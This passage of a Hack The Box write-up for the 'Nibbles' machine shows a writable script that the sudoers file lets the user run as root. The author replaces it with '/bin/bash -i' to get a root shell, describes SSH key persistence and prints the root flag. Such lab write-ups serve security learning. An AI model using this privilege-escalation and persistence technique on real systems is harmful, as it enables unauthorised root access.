+</span></span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> If any bug, report us in the link below                                                          #</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> Free to use/edit/distribute the code below by                                                    #</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell"> giving proper credit to Tecmint.com and Author                                                   #</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">                                                                                                  #</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">                  <span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">###################################################################################################</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&lt;</span>SNIP<span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">su</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>cp <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">scriptname</span></span> /usr/bin/monitor<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> root</span> <span class="z-keyword z-operator z-logical z-and z-shell">&amp;&amp;</span> <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Congratulations! Script Installed, now run monitor Command<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-or z-shell">||</span> <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Installation failed<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&lt;</span>SNIP<span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>
+</span></code></pre>
+<p>It's a Bash script used to monitor various metrics like network, disk usage,
+uptime, load average and RAM usage.</p>
+<p>It was written for
+<a href="https://www.tecmint.com/linux-server-health-monitoring-script/">this Tecmint blog post</a>
+and the source code can be found at
+<a href="https://github.com/atarallo/TECMINT_MONITOR">this GitHub repository</a>.</p>
+<p>One line of this script that struck me is the one that calls <code>su -c</code> followed by
+a command. If this script is able to impersonate <code>root</code> to execute that command,
+it means that it has special permissions somehow.</p>
+<h3 id="sudo-permissions">Sudo permissions</h3>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Matching Defaults entries for nibbler on Nibbles:
+</span><span class="z-text z-plain">    env_reset, mail_badpass,
+</span><span class="z-text z-plain">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">User nibbler may run the following commands on Nibbles:
+</span><span class="z-text z-plain">    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</span></code></pre>
+<p>We can execute the <code>monitor.sh</code> script in <code>/home/nibbler/personal/stuff</code>! In
+fact, it would be the location of the <code>monitor.sh</code> file we just inspected if we
+unzipped <code>personal.zip</code> in our home folder.</p>
+<h2 id="privilege-escalation-sudo-permissions">Privilege escalation (Sudo permissions)</h2>
+<p>Since we can execute <code>/home/nibbler/personal/stuff/monitor.sh</code> as <code>root</code> and
+that we have control over this path, we simply have to create our own
+<code>monitor.sh</code> Bash script at this location to execute it as <code>root</code>!</p>
+<h3 id="preparation-1">Preparation</h3>
+<p>The goal is to obtain an elevated shell.</p>
+<p>I'll create a <code>monitor.sh</code> script in <code>/home/nibbler/personal/stuff</code> to execute
+<code>/bin/bash</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/bin/bash</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span></span>
+</span></code></pre>
+<p>Then, I'll make it executable.</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Let's abuse our <code>sudo</code> permissions to execute the
+<code>/home/nibbler/personal/stuff/monitor.sh</code> file as <code>root</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">nibbler@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> sudo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/nibbler/personal/stuff/monitor.sh<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">root@Nibbles:~#
+</span></code></pre>
+<p>Yay!</p>
+<h3 id="establishing-persistence">Establishing persistence</h3>
+<p>Let's use SSH to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Nibbles as <code>root</code>.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@Nibbles:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">e6b595f5f8926283aca435c7b3467ade
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nibbles/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Not too easy' and the root flag as 'Very easy'. The
+foothold was hard to find and really frustrating, as it required to guess that
+the password was the name of the box, and we only had 5 login attempts before
+being blacklisted and having to reset the box. It was easy to identify a CVE and
+exploit it once logged in on Nibbleblog though. Thankfully, the privilege
+escalation was much easier and really classic.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
